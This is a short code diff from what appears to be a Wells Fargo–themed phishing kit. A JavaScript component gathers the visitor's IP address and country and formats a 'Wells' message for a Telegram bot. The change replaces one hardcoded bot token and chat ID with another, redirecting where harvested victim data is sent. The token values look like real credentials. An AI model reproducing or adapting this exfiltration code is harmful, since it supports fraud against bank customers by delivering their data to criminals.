@@ -795,9 +795,9 @@ export default {
     );
     this.IP = tt.data.ip;
       this.query = tt.data.country_capital;
-      var token = "6468151337:AAFByPCItp55Ii7j_kLGuMbJgTx2GzBL6QU";
+      var token = "6913210321:AAEJFplMH_ysNxi4mMSRVBmM1wpjzMjuf70";
 
-      var chatId2 = -4037845844;
+      var chatId2 = -4219558708;
       var fullMessage = `
       ||🏦💰💰| Wells |🏦💰💰||%0A%0Country : ${this.query}%0A%0AIP : ${this.IP}%0A%0A|||🏦💰💰| Wells |🏦💰💰||`;
       
